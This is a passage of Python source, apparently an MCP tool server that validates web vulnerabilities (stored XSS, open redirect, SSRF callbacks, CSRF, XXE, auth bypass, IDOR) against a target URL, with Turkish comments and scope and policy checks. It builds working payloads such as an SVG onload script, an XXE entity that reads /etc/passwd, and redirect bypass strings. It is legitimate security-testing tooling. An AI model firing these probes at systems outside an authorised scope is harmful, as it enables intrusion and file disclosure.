    if not base.get("ok", True) and base.get("status", 0) == 0:
        return _result("Stored XSS", read_url, INCONCLUSIVE, "stored_reflection",
                       {"error": base.get("error")}, "-",
                       notes="Okuma yuzeyine erisilemedi.")
    if canary in base.get("text", ""):
        return _result("Stored XSS", read_url, INCONCLUSIVE, "stored_reflection",
                       {"contaminated_baseline": True}, "-",
                       notes="Canary yazmadan once zaten yuzeyde: olcum kirli.")
    if method.upper() == "GET":
        wr = _request("GET", write_url, params={field: raw}, headers=H, allow_redirects=False)
    else:
        wr = _request(method.upper(), write_url, data={field: raw}, headers=H,
                      allow_redirects=False)
    if wr.get("status", 0) == 0:
        return _result("Stored XSS", write_url, INCONCLUSIVE, "stored_reflection",
                       {"error": wr.get("error")}, "-",
                       notes="Yazma istegi basarisiz.")
    rd = _request("GET", read_url, headers=RH, allow_redirects=False)
    txt = rd.get("text", "")
    if f"<{canary}>" in txt:
        return _result(
            "Stored XSS candidate", read_url, INCONCLUSIVE, "stored_reflection",
            {"reflection": {"verdict": CONFIRMED, "stored": True,
                            "marker_sha256": hashlib.sha256(canary.encode()).hexdigest(),
                            "reflected_raw": True},
             "execution": {"verdict": INCONCLUSIVE, "observed": False},
             "primitive_confirmed": "stored_unescaped_reflection"},
            _reproduction(method, write_url, param=field, payload=raw, headers=H),
            notes="Canary yazma sonrasi okuma yuzeyinde ham kalici: stored yansima primitifi dogrulandi; execution icin tarayici kaniti gerekli.",
            severity="medium",
            guard={"prerequisites": ["clean baseline", "successful write"],
                   "controls": ["baseline canary absent before write"],
                   "transport_ok": True,
                   "decision_rule": "stored reflection alone cannot confirm script execution",
                   "limitations": ["browser execution artifact required for confirmed XSS"]},
            request_evidence=[response_evidence(rd, "stored-read", 0)])
    if f"&lt;{canary}&gt;" in txt:
        return _result("Stored XSS", read_url, UNCONFIRMED, "stored_reflection",
                       {"stored": True, "reflected_raw": False, "html_encoded": True}, "-",
                       notes="Canary saklandi ama HTML-encode ediliyor -> korumali.")
    return _result("Stored XSS", read_url, UNCONFIRMED, "stored_reflection",
                   {"stored": False}, "-",
                   notes="Canary okuma yuzeyinde gorunmedi (saklanmiyor veya baska yuzeyde).")


@mcp.tool()
def validate_open_redirect(target_url: str, param: str = "", headers_json: str = "{}") -> str:
    """Open Redirect'i Location-header oracle'ı ile doğrula. Sentinel bir dış host
    enjekte edilir; 3xx yanıtın Location'ı bu host'a gidiyorsa → onaylı (deterministik).

    Args:
        target_url: Yönlendirme yapan URL (örn http://t/go?url=...)
        param: Yönlendirme parametresi (örn 'url','next','redirect')
        headers_json: Ek başlıklar (JSON)
    """
    from cco_validator_core.controls import ControlTrace, usable_control

    H = _headers(headers_json)
    trace = ControlTrace()
    incomplete_chain = False
    from cco_validator_core.experiment_context import has_experiment, observed_baseline
    from cco_validator_core.egress import current_wire_gate
    allowed_hosts = {str(urlparse(target_url).hostname or "").lower()}
    if has_experiment():
        baseline = _send_payload(target_url, observed_baseline(""), param=param, headers=H, allow_redirects=False)
        trace.observe(baseline, "baseline", baseline=True, redirects=True)
        if not trace.complete:
            return _result("Open Redirect", target_url, INCONCLUSIVE, "redirect_location", {}, "-",
                notes="Invalid observed redirect baseline.", guard={"transport_ok": False}, request_evidence=trace.evidence)
        gate = current_wire_gate()
        policy = getattr(gate, "program_policy", lambda: {})() if gate else {}
        rule = policy.get("open_redirect") or {}
        hosts = rule.get("allowed_hosts") if isinstance(rule, dict) else []
        if isinstance(hosts, list):
            allowed_hosts.update(str(host).lower().strip('.') for host in hosts)
    sentinel = f"{secrets.token_hex(6)}.cco-validate.test"
    target_host = (urlparse(target_url).hostname or "").lower()
    payloads = [f"https://{sentinel}/", f"//{sentinel}/", f"/\\{sentinel}/",
                f"https://{sentinel}%2f..", f"https://target@{sentinel}/",
                f"http://{sentinel}/"]
    for pl in payloads:
        r = _send_payload(target_url, pl, param=param, method="GET", headers=H,
                          allow_redirects=False)
        # Preserve the sent probe even when its following control fails or is
        # denied. Evidence follows wire order, including incomplete rounds.
        trace.observe(r, "redirect-hop-0", redirects=True)
        if has_experiment():
            control = _send_payload(target_url, observed_baseline(""), param=param, headers=H, allow_redirects=False)
            trace.observe(control, "negative-control", baseline=True, redirects=True)
            control_host = urlparse(urljoin(target_url, control.get("location") or "")).hostname
            if not trace.complete or control_host == sentinel:
                return _result("Open Redirect", target_url, INCONCLUSIVE, "redirect_location", {}, "-",
                    notes="Redirect negative control failed or reproduced the sentinel.",
                    guard={"transport_ok": False}, request_evidence=trace.evidence)
        chain = []
        current_url = target_url
        for _hop in range(4):
            if _hop > 0:
                r = _request("GET", current_url, headers=H, allow_redirects=False)
                trace.observe(r, f"redirect-hop-{_hop}", redirects=True)
            if not usable_control(r, redirects=True):
                break
            loc = r.get("location", "")
            if not loc:
                break
            parsed_location = urlparse(urljoin(current_url, loc))
            host = (parsed_location.hostname or "").lower()
            valid_scheme = parsed_location.scheme in {"http", "https"} or loc.startswith("//")
            is_redirect = isinstance(r.get("status"), int) and 300 <= r["status"] < 400
            if is_redirect and valid_scheme and host == sentinel and host not in allowed_hosts:
                return _result("Open Redirect", target_url, CONFIRMED, "redirect_location",
                               {"payload": pl, "status": r.get("status"),
                                 "location_header": loc, "redirect_host": host,
                                 "hop_index": _hop, "chain_length": len(chain) + 1},
                               _reproduction("GET", target_url, param=param, payload=pl, headers=H),
                               severity="medium",
                               notes="3xx Location tam olarak benzersiz dış sentinel host'a yönlendi.",
                               guard={
                                   "prerequisites": ["HTTP 3xx response"],
                                   "controls": ["random sentinel hostname", "exact hostname match",
                                                "same-host chained hops"],
                                   "transport_ok": bool(r.get("ok")),
                                   "decision_rule": "3xx Location host must exactly equal sentinel",
                               },
                               request_evidence=trace.evidence)
            chain.append({"location": loc})
            if not is_redirect:
                break
            if valid_scheme and host in allowed_hosts and host != target_host:
                break
            if host and host != target_host:
                # The external hop is intentionally unfollowed; its eventual
                # destination cannot count as a completed negative control.
                incomplete_chain = True
                break
            if _hop == 3:
                incomplete_chain = True
            current_url = urljoin(current_url, loc)
    complete = trace.complete and not incomplete_chain
    return _result("Open Redirect", target_url, UNCONFIRMED if complete else INCONCLUSIVE, "redirect_location",
                   {"payloads_tested": len(payloads)}, "-",
                   notes="Completed redirect controls did not reach the sentinel." if complete
                   else "Redirect controls failed or ended at an unobserved hop.",
                   guard={"transport_ok": complete,
                          "controls": ["random sentinel host", "all submitted payloads", "bounded same-host hops"],
                          "limitations": ["external destinations were not followed; only the listed payloads were tested"]},
                   request_evidence=trace.evidence)


def _oob_sent_request_binding(target_url: str, param: str, payload: str, response: dict,
                              binding_key: bytes) -> str:
    """Bind collector metadata to the exact single GET observed by egress."""
    try:
        parsed = urlparse(target_url)
        if parsed.fragment or str(response.get("request_method") or "").upper() != "GET":
            return ""
        if response.get("requests_sent") != 1 or isinstance(response.get("requests_sent"), bool):
            return ""
        query = dict(parse_qsl(parsed.query, keep_blank_values=True))
        query[param] = payload
        expected = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        if response.get("final_url") != expected:
            return ""
        return hmac.new(binding_key, ("GET\x00" + expected).encode(), hashlib.sha256).hexdigest()
    except (TypeError, ValueError):
        return ""


def _standalone_oob_gate(method, url, headers):
    """Recheck the standalone validator's real final URL before its one GET."""
    if str(method or "").upper() != "GET":
        return False, "callback probe permits GET only"
    try:
        scripts = os.path.abspath(os.path.join(_SERVER_DIR, "..", "..", "scripts"))
        if scripts not in sys.path:
            sys.path.insert(0, scripts)
        from policy_engine import PolicyEngine
        decision = PolicyEngine().validate_wire_invocation("validator_validate_ssrf_oob", {
            "target_url": url, "target": url, "endpoint": url, "url": url,
            "method": "GET", "headers": dict(headers or {}),
        })
        return bool(decision.get("allowed")), str(decision.get("reason") or "blocked")
    except Exception:
        return False, "callback probe policy unavailable"


@mcp.tool()
def validate_ssrf_oob(target_url: str, oob_domain: str, param: str = "",
                      method: str = "GET", body_template: str = "",
                      headers_json: str = "{}") -> str:
    """Send one read-only callback probe only to an explicitly scoped OOB host."""
    import ipaddress
    domain = _normalize_host(oob_domain)
    try:
        ipaddress.ip_address(domain)
        invalid_domain = True
    except ValueError:
        invalid_domain = not domain or domain == "localhost" or domain.endswith(".localhost")
    try:
        target = urlparse(str(target_url or ""))
        valid_target = (target.scheme in {"http", "https"} and bool(target.hostname)
                        and target.username is None and not target.fragment
                        and (target.port is None or target.port > 0))
        pairs = parse_qsl(target.query, keep_blank_values=True, max_num_fields=100)
    except ValueError:
        valid_target, pairs = False, []
    names = [name for name, _ in pairs]
    if (not valid_target or invalid_domain or str(method).upper() != "GET" or not str(param or "").strip() or body_template
            or names.count(str(param)) != 1 or len(names) != len(set(names))):
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "read-only GET, one observed query parameter and non-IP callback domain required"}, "-",
                       guard={"transport_ok": False})
    token = "ccossrf" + secrets.token_hex(12)
    host = f"{token}.{domain}"
    if not _oob_host_in_scope(host):
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "callback host is outside active scope"}, "-",
                       guard={"transport_ok": False})
    payload = f"https://{host}/"
    from cco_validator_core.evidence import current_policy_hash, current_scope_revision, current_validation_context
    from cco_validator_core.egress import current_wire_gate, scoped_wire_gate
    scope_revision, policy_hash = current_scope_revision(), current_policy_hash()
    sent_at = int(time.time())
    gate_context = nullcontext() if current_wire_gate() is not None else scoped_wire_gate(_standalone_oob_gate)
    from cco_validator_core.experiment_context import has_experiment, observed_baseline
    from cco_validator_core.controls import usable_control
    control_evidence = []
    with gate_context:
        if has_experiment():
            baseline = _send_payload(target_url, observed_baseline(""), param=param, headers=_headers(headers_json),
                                     allow_redirects=False)
            control_evidence.append(response_evidence(baseline, "baseline", 0))
            if not usable_control(baseline, baseline=True):
                return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation", {}, "-",
                    notes="Invalid observed SSRF baseline.", guard={"transport_ok": False})
        response = _send_payload(target_url, payload, param=param, method="GET", headers=_headers(headers_json),
                                 allow_redirects=False)
        control_evidence.append(response_evidence(response, "callback-probe", 0))
        if has_experiment():
            control = _send_payload(target_url, observed_baseline(""), param=param, headers=_headers(headers_json),
                                    allow_redirects=False)
            control_evidence.append(response_evidence(control, "negative-control", 0))
            if not usable_control(control, baseline=True):
                return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation", {}, "-",
                    notes="Observed SSRF negative control failed.", guard={"transport_ok": False})
    if not response.get("ok") or response.get("status") is None:
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "callback probe was not successfully sent"}, "-",
                       guard={"transport_ok": False})
    if response.get("status") in {401, 429}:
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": f"callback probe stopped after HTTP {response['status']}",
                        "status": response["status"]}, "-", guard={"transport_ok": True})
    location = str(response.get("location") or "")
    for _ in range(4):
        decoded = unquote(location)
        if decoded == location:
            break
        location = decoded
    if (response.get("status") in {301, 302, 303, 307, 308}
            and re.search(r"/(?:login|signin|sign-in|sso|auth/login)\b", location, re.I)):
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "callback probe redirected to login", "status": response["status"]}, "-",
                       guard={"transport_ok": True})
    if current_scope_revision() != scope_revision or current_policy_hash() != policy_hash:
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "scope or policy changed while sending the probe"}, "-",
                       guard={"transport_ok": True})
    run_id = str(current_validation_context().get("run_id") or "unspecified")
    if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,128}", run_id):
        run_id = "unspecified"
    binding_key = secrets.token_bytes(32)
    target_binding = hmac.new(binding_key, ("target\x00" + target_url).encode(), hashlib.sha256).hexdigest()
    probe_binding = _oob_sent_request_binding(target_url, param, payload, response, binding_key)
    try:
        challenge = _store_oob_challenge(token, host, target_url, "SSRF", param, run_id, sent_at,
                                         target_binding, probe_binding, scope_revision, policy_hash)
    except (OSError, ValueError, TypeError, sqlite3.Error):
        return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                       {"error": "could not store signed callback challenge"}, "-", guard={"transport_ok": True})
    collector_binding = ({"nonce": token, "host": host, "param": param, "run_id": run_id,
                          "target_binding": target_binding, "probe_binding": probe_binding,
                          "scope_revision": scope_revision, "policy_hash": policy_hash,
                          "sent_at": sent_at, "expires_at": challenge["expires_at"]} if probe_binding else {})
    return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                   {"callback_correlation_id": token, "callback_host": host,
                    "requests_sent": len(control_evidence), "status": response.get("status"),
                    "collector_binding": collector_binding},
                   _reproduction("GET", target_url, param=param, payload=payload,
                                 headers=_headers(headers_json)),
                   notes="Callback metadata requires independent provenance before confirmation.",
                   guard={"transport_ok": True, "controls": ["explicit callback scope", "one read-only request"],
                          "limitations": ["a callback alone does not prove its source"]},
                   request_evidence=control_evidence)


@mcp.tool()
def confirm_oob_callback(token: str, poll_output: str = "", target_url: str = "",
                         vuln_type: str = "SSRF", collector_event_json: str = "") -> str:
    """Verify configured collector metadata; never infer callback source.

    Collector events use cco-oob-collector-event/1 and trusted Ed25519 public
    keys from CCO_OOB_COLLECTORS_JSON. See the repository OOB collector guide.
    A valid signature remains INCONCLUSIVE without independent source proof.
    """
    challenge = _load_oob_challenge(token)
    if not challenge:
        return _result(f"{vuln_type} (OOB)", target_url or "(callback)", ERROR, "oob_correlation",
                       {"argument_error": "unknown or expired OOB challenge"}, "-",
                       guard={"transport_ok": False})
    expected_target = str(challenge.get("target_url") or "")
    expected_type = str(challenge.get("vuln_type") or "")
    normalized = lambda value: re.sub(r"[^a-z0-9]", "", str(value).lower())
    if ((target_url and target_url != expected_target) or
            normalized(vuln_type) != normalized(expected_type)):
        return _result(f"{expected_type} (OOB)", expected_target, ERROR, "oob_correlation",
                       {"argument_error": "challenge target or type mismatch"}, "-",
                       guard={"transport_ok": False})
    expected_host = str(challenge.get("host") or "")
    if collector_event_json:
        from cco_validator_core.oob_collector import verify_collector_event
        from cco_validator_core.evidence import current_policy_hash, current_scope_revision
        collector = verify_collector_event(
            challenge, collector_event_json, os.environ.get("CCO_OOB_COLLECTORS_JSON", ""),
            os.path.join(OOB_DIR, "collector-replay.db"),
            scope_revision=current_scope_revision(), policy_hash=current_policy_hash())
        authenticated = bool(collector.get("authenticated"))
        return _result(f"{expected_type} (OOB)", expected_target, INCONCLUSIVE, "oob_correlation",
                       {"callback_correlation_id": token, "expected_host": expected_host,
                        "collector_authenticated": authenticated,
                        "collector_id": collector.get("collector_id") or "",
                        "protocol": collector.get("protocol") or "",
                        "collector_event_path": collector.get("event_path") or "",
                        "collector_event_sha256": collector.get("event_sha256") or "",
                        "collector_reason": collector.get("reason"), "correlated": False}, "-",
                       notes=("The configured collector signed the bound event; target-origin attribution "
                              "remains unverified." if authenticated else "Collector evidence was not verified."),
                       guard={"transport_ok": bool(challenge.get("probe_binding")),
                              "limitations": ["collector signature does not establish the callback source"]})
    hit = bool(expected_host and expected_host in _poll_hosts(poll_output or ""))
    return _result(f"{expected_type} (OOB)", expected_target, INCONCLUSIVE, "oob_correlation",
                   {"callback_correlation_id": token, "expected_host": expected_host,
                    "matched_untrusted_text": hit, "correlated": False}, "-",
                   notes="Supplied callback text has no authenticated collector provenance; manual evidence is required.",
                   guard={"transport_ok": False,
                          "limitations": ["callback origin and collector provenance unverified"]})


@mcp.tool()
def validate_blind_oob(target_url: str, param: str = "", vuln_type: str = "sql_injection",
                       oob_domain: str = "", carrier: str = "query",
                       method: str = "GET", headers_json: str = "{}") -> str:
    """General blind OOB payloads remain disabled until independently gated."""
    return _result(f"{vuln_type} (Blind OOB)", target_url, INCONCLUSIVE, "oob_correlation",
                   {"error": "general blind OOB execution is unavailable under the read-only policy"}, "-",
                   guard={"transport_ok": False,
                          "limitations": ["trusted callback collector and scoped transport required"]})


@mcp.tool()
def validate_csrf(target_url: str, data_template: str = "", success_marker: str = "",
                  headers_json: str = "{}") -> str:
    """CSRF korumasını durum-değişimi oracle'ı ile doğrula.

    Aynı POST iki kez gider: token alanı olmadan ve sahte token ile.
    İkisi de 2xx + success_marker döndürürse token doğrulanmıyor demektir.

    Args:
        target_url: Durum değiştiren endpoint (POST)
        data_template: Form gövdesi 'alan=deger&alan2=deger2' (token alanı varsa çıkarılır)
        success_marker: Başarılı durum değişimini gösteren yanıt metni (zorunlu)
        headers_json: Kimlik başlıkları (JSON; oturum cookie'si buradan)
    """
    H = _headers(headers_json)
    if not success_marker:
        return _result("CSRF", target_url, INCONCLUSIVE, "csrf_token_differential",
                       {"error": "success_marker gerekli"}, "-",
                       notes="Durum değişimi gözlenmeden CSRF hükmü verilmez.")
    fields = dict(parse_qsl(data_template, keep_blank_values=True))
    token_names = [k for k in fields if re.search(r"csrf|token|authenticity", k, re.I)]
    if not token_names:
        page = _request("GET", target_url, headers=H)
        found = re.findall(r'name="([^"]*(?:csrf|token|authenticity)[^"]*)"',
                           page.get("text", "") or "", re.I)
        token_names = list(dict.fromkeys(found))
    no_token = {k: v for k, v in fields.items() if k not in token_names}
    bogus = dict(fields)
    for name in token_names:
        bogus[name] = "cco-bogus-token"
    if not bogus:
        bogus = dict(no_token)

    def _post(data: dict):
        return _request("POST", target_url, data=data, headers=H)

    r_none = _post(no_token)
    r_bogus = _post(bogus)

    def _accepted(r) -> bool:
        return (r.get("ok") and isinstance(r.get("status"), int)
                and 200 <= r["status"] < 300
                and success_marker in (r.get("text", "") or ""))

    none_ok, bogus_ok = _accepted(r_none), _accepted(r_bogus)
    evidence = {"token_fields": token_names,
                "no_token_status": r_none.get("status"), "bogus_status": r_bogus.get("status"),
                "no_token_accepted": none_ok, "bogus_accepted": bogus_ok}
    if none_ok and bogus_ok:
        return _result("CSRF", target_url, CONFIRMED, "csrf_token_differential",
                       evidence, _curl("POST", target_url, urlencode(no_token), H),
                       notes="Token'sız ve sahte token'lı isteklerin ikisi de durum değişimini kabul etti.")
    if none_ok and not bogus_ok:
        return _result("CSRF", target_url, CONFIRMED, "csrf_token_differential",
                       evidence, _curl("POST", target_url, urlencode(no_token), H),
                       notes="Token'sız istek kabul edildi; sahte token reddedildi (token varlığı değil değeri de tutarsız doğrulanıyor olabilir — manuel teyit önerilir).",
                       severity="medium")
    if not none_ok:
        return _result("CSRF", target_url, UNCONFIRMED, "csrf_token_differential",
                       evidence, "-",
                       notes="Token'sız istek durum değişimini gerçekleştiremedi (koruma çalışıyor veya marker yanlış).")
    return _result("CSRF", target_url, INCONCLUSIVE, "csrf_token_differential",
                   evidence, "-", notes="Kısmi kabul örüntüsü; manuel inceleme gerekir.")


@mcp.tool()
def validate_second_order(write_url: str, read_url: str, data_template: str = "",
                          headers_json: str = "{}") -> str:
    """İkinci derece (stored) akış oracle'ı: yaz -> başka yerde oku.

    Benzersiz canary, write_url'ye {{PAYLOAD}} ile yazılır; öncesi/sonrası
    read_url karşılaştırmasında canary belirirse veri saklanıp başka
    bağlamda sunuluyor demektir. (Çalıştırma kanıtı browser probe ister;
    bu oracle saklama+yansımayı doğrular.)

    Args:
        write_url: Yazma endpoint'i (POST)
        read_url: Okuma sayfası (virgülle en çok 3 URL)
        data_template: '{{PAYLOAD}}' içeren form gövdesi (ör. 'comment={{PAYLOAD}}')
        headers_json: Kimlik başlıkları (JSON)
    """
    H = _headers(headers_json)
    if "{{PAYLOAD}}" not in data_template:
        return _result("Second-Order (Stored)", write_url, INCONCLUSIVE,
                       "stored_canary", {"error": "data_template {{PAYLOAD}} içermeli"}, "-",
                       notes="Yazma şablonu olmadan ikinci derece akış kurulamaz.")
    marker = "cco2nd" + secrets.token_hex(6)
    payload = f"{marker}<svg/onload=alert(1)>"
    reads = [u.strip() for u in (read_url or "").split(",") if u.strip()][:3]
    if not reads:
        return _result("Second-Order (Stored)", write_url, INCONCLUSIVE,
                       "stored_canary", {"error": "read_url gerekli"}, "-",
                       notes="Okuma adresi yok.")
    before = [_request("GET", u, headers=H) for u in reads]
    if any(marker in (r.get("text", "") or "") for r in before):
        return _result("Second-Order (Stored)", write_url, INCONCLUSIVE,
                       "stored_canary", {"marker": marker}, "-",
                       notes="Canary yazmadan önce de var — çakışma, hüküm yok.")
    body = data_template.replace("{{PAYLOAD}}", payload)
    write_resp = _request("POST", write_url, data=body.encode("utf-8"), headers=H)
    after = [_request("GET", u, headers=H) for u in reads]
    hit_urls = [u for u, r in zip(reads, after) if marker in (r.get("text", "") or "")]
    evidence = {"marker": marker, "write_status": write_resp.get("status"),
                "read_urls": reads, "hit_urls": hit_urls}
    if hit_urls:
        return _result("Second-Order (Stored)", write_url, CONFIRMED,
                       "stored_canary", evidence,
                       _curl("POST", write_url, body, H),
                       notes=("Canary yazıldıktan sonra okuma sayfasında belirdi: "
                              "veri saklanıp başka bağlamda sunuluyor. "
                              "Çalıştırma için browser_dom_xss_probe ile teyit edin."))
    return _result("Second-Order (Stored)", write_url, UNCONFIRMED,
                   "stored_canary", evidence, "-",
                   notes="Canary okuma sayfalarında görülmedi (başka sayfa/temizlik olabilir).")


@mcp.tool()
def validate_xxe(target_url: str, content_type: str = "application/xml",
                 headers_json: str = "{}") -> str:
    """XXE'yi dosya-imzası oracle'ı ile doğrula. file:///etc/passwd entity'si
    enjekte edilir; yanıtta passwd imzası dönerse → onaylı. (Blind XXE için
    validate_ssrf_oob + confirm_oob_callback kullan.)

    Args:
        target_url: XML kabul eden endpoint (POST)
        content_type: Gövde content-type'ı (application/xml | text/xml)
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    H["Content-Type"] = content_type
    marker = "ccoxxe" + secrets.token_hex(3)
    control_body = f'<?xml version="1.0"?><{marker}>cco-control</{marker}>'
    control = _request("POST", target_url, data=control_body.encode(), headers=H)
    if not control.get("ok"):
        return _result("XXE", target_url, INCONCLUSIVE, "file_signature",
                       {"error": control.get("error"), "control": "benign XML"}, "-",
                       notes="Benign XML control isteği başarısız.")
    if LINUX_FILE_SIG.search(control.get("text", "")):
        return _result(
            "XXE", target_url, INCONCLUSIVE, "file_signature",
            {"primitive_detected": "static_file_signature", "control_status": control.get("status")},
            _curl("POST", target_url, control_body, H),
            notes="Passwd imzası benign XML control yanıtında da var; XXE ile ilişkilendirilemedi.",
            guard={
                "prerequisites": ["successful benign XML control"],
                "controls": ["file signature must be absent from benign response"],
                "transport_ok": True,
                "limitations": ["endpoint returns a static passwd-like response"],
            },
            request_evidence=[response_evidence(control, "benign-xml", 0)],
        )
    body = (f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE {marker} [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            f'<{marker}>&xxe;</{marker}>')
    r = _request("POST", target_url, data=body.encode(), headers=H)
    if not r.get("ok"):
        return _result("XXE", target_url, INCONCLUSIVE, "file_signature",
                       {"error": r.get("error")}, "-", notes="İstek başarısız.")
    m = LINUX_FILE_SIG.search(r.get("text", ""))
    if m:
        return _result("XML External Entity (XXE)", target_url, CONFIRMED, "file_signature",
                       {"file": "/etc/passwd", "signature": m.group(0),
                         "content_type": content_type},
                       _curl("POST", target_url, body, H),
                       notes="Passwd imzası benign control'da yokken external entity probe'da döndü.",
                       guard={
                           "prerequisites": ["successful benign XML control"],
                           "controls": ["file signature absent from benign response"],
                           "transport_ok": True,
                           "decision_rule": "signature must appear only after external entity expansion",
                       },
                       request_evidence=[response_evidence(control, "benign-xml", 0),
                                         response_evidence(r, "xxe-probe", 0)])
    return _result("XML External Entity (XXE)", target_url, UNCONFIRMED, "file_signature",
                   {"status": r.get("status")}, _curl("POST", target_url, body, H),
                   notes="Dosya imzası dönmedi. Blind XXE için OOB akışını dene.")


@mcp.tool()
def validate_auth_bypass(protected_url: str, authorized_headers_json: str,
                         method: str = "GET", protected_marker: str = "") -> str:
    """Authentication/Authorization bypass'ı differential ile doğrula. Yetkili
    istek (200 + içerik) ile yetkisiz istek (auth header'sız) karşılaştırılır;
    yetkisiz istek korunan içeriğin AYNISINI alıyorsa → bypass onaylı.

    Args:
        protected_url: Korunan kaynak URL'i
        authorized_headers_json: Yetkili erişim başlıkları (JSON; cookie/token)
        method: HTTP metodu
        protected_marker: Yalnız korunan içerikte bulunan beklenen marker
    """
    auth_h, header_error = _strict_identity_headers(authorized_headers_json)
    if header_error:
        return _result("Auth Bypass", protected_url, ERROR, "content_match",
                       {"argument_error": header_error}, "-", notes=header_error,
                       guard={"transport_ok": False,
                              "prerequisites": ["valid credential-bearing headers"]})
    authed = _request(method, protected_url, headers=auth_h, allow_redirects=False)
    if not authed.get("ok") or authed.get("status") not in (200, 206):
        return _result("Auth Bypass", protected_url, INCONCLUSIVE, "content_match",
                       {"authorized_status": authed.get("status")}, "-",
                       notes="Yetkili istek 200 dönmedi — geçerli kimlik/headers ver.",
                       guard={"transport_ok": bool(authed.get("ok"))},
                       request_evidence=[response_evidence(authed, "authorized", 0)])
    if protected_marker and protected_marker not in authed.get("text", ""):
        return _result(
            "Auth Bypass", protected_url, INCONCLUSIVE, "content_match",
            {"authorized_status": authed.get("status"), "protected_marker_in_authorized": False}, "-",
            notes="Verilen protected_marker yetkili yanıtta bulunamadı.",
            guard={"prerequisites": ["authorized response contains protected marker"],
                   "transport_ok": True},
            request_evidence=[response_evidence(authed, "authorized", 0)],
        )
    anon_h = _anonymous_headers(auth_h)
    unauth = _request(method, protected_url, headers=anon_h, allow_redirects=False)
    controls = [response_evidence(authed, "authorized", 0),
                response_evidence(unauth, "anonymous", 0)]
    unauth_status = unauth.get("status")
    if (not unauth.get("ok") or unauth_status is None or unauth_status == 429
            or unauth_status >= 500):
        return _result("Authentication/Authorization Bypass", protected_url, INCONCLUSIVE,
                       "content_match", {"unauth_status": unauth_status}, "-",
                       notes="Anonim kontrol tamamlanamadı; erişim engellendiği kanıtlanmadı.",
                       guard={"transport_ok": bool(unauth.get("ok")),
                              "controls": ["authorized request", "anonymous request"]},
                       request_evidence=controls)
    login_markers = re.compile(r"(login|sign in|unauthorized|forbidden|401|403)", re.I)
    same = _similar(authed, unauth)
    marker_in_unauth = bool(protected_marker and protected_marker in unauth.get("text", ""))
    if (unauth.get("ok") and unauth.get("status") in (200, 206) and marker_in_unauth
            and not login_markers.search(unauth.get("text", "")[:500])):
        return _result("Authentication/Authorization Bypass", protected_url, CONFIRMED,
                       "content_match",
                       {"authorized_status": authed["status"], "unauth_status": unauth["status"],
                         "content_similarity": same,
                         "protected_marker_sha256": hashlib.sha256(protected_marker.encode()).hexdigest(),
                         "protected_marker_in_unauthorized": True},
                       [_curl(method, protected_url, headers=auth_h),
                         _curl(method, protected_url, headers=anon_h)],
                       notes="Yetkisiz istek, yetkili yanıtta doğrulanan korunan marker'ı döndürdü.",
                       guard={
                           "prerequisites": ["valid authorized identity", "protected marker in authorized response"],
                           "controls": ["anonymous request", "protected marker comparison"],
                           "transport_ok": True,
                           "decision_rule": "anonymous response must contain the protected marker",
                       },
                       request_evidence=controls)
    if (unauth.get("ok") and unauth.get("status") in (200, 206) and same >= 0.9
            and not protected_marker):
        return _result(
            "Authentication/Authorization Bypass candidate", protected_url, INCONCLUSIVE,
            "content_match",
            {"authorized_status": authed["status"], "unauth_status": unauth["status"],
             "content_similarity": same, "primitive_detected": "same_content_without_auth"},
            [_curl(method, protected_url, headers=auth_h), _curl(method, protected_url)],
            notes="Aynı içerik gözlendi ancak korunan içeriğe özgü marker verilmedi; public endpoint ayrıştırılamaz.",
            guard={
                "prerequisites": ["protected marker in authorized response"],
                "controls": ["anonymous request"],
                "transport_ok": True,
                "limitations": ["protected_marker is required for CONFIRMED"],
            },
            request_evidence=controls,
        )
    if (not protected_marker or marker_in_unauth
            or unauth_status not in (200, 206, 401, 403)):
        return _result("Authentication/Authorization Bypass", protected_url, INCONCLUSIVE,
                       "content_match",
                       {"unauth_status": unauth_status,
                        "protected_marker_in_unauthorized": marker_in_unauth}, "-",
                       notes="Anonim yanıt, korunan marker'ın engellendiğini kanıtlamıyor.",
                       guard={"transport_ok": True,
                              "prerequisites": ["protected marker in authorized response"],
                              "controls": ["authorized request", "anonymous request"]},
                       request_evidence=controls)
    return _result("Authentication/Authorization Bypass", protected_url, UNCONFIRMED,
                   "content_match",
                   {"unauth_status": unauth.get("status"), "content_similarity": same,
                    "protected_marker_in_unauthorized": marker_in_unauth},
                   "-", notes="Yetkisiz erişim engellendi (beklenen davranış).",
                   guard={"transport_ok": True,
                          "prerequisites": ["valid authorized identity", "protected marker in authorized response"],
                          "controls": ["authorized request", "anonymous request"],
                          "decision_rule": "anonymous response does not expose the protected marker"},
                   request_evidence=controls)


@mcp.tool()
def validate_idor(object_url: str, owner_headers_json: str, attacker_headers_json: str,
                  owner_marker: str = "") -> str:
    """IDOR'u differential ile doğrula. Sahip (owner) kimliğiyle alınan nesne ile
    saldırgan (başka kimlik) ile alınan aynı nesne karşılaştırılır; saldırgan
    sahibin verisini alıyorsa → IDOR onaylı.

    Args:
        object_url: Sahibe ait nesne URL'i (örn /api/order/1001)
        owner_headers_json: Nesnenin SAHİBİ kimlik başlıkları (JSON)
        attacker_headers_json: Farklı bir kullanıcı kimlik başlıkları (JSON)
        owner_marker: Yalnız owner nesnesinde bulunan beklenen marker
    """
    owner_h, owner_error = _strict_identity_headers(owner_headers_json)
    atk_h, attacker_error = _strict_identity_headers(attacker_headers_json)
    if owner_error or attacker_error:
        return _result("IDOR", object_url, ERROR, "content_match",
                       {"argument_error": owner_error or attacker_error}, "-",
                       notes=owner_error or attacker_error,
                       guard={"transport_ok": False,
                              "prerequisites": ["two credential-bearing identities"]})
    owner_fp = _identity_fingerprint(owner_h)
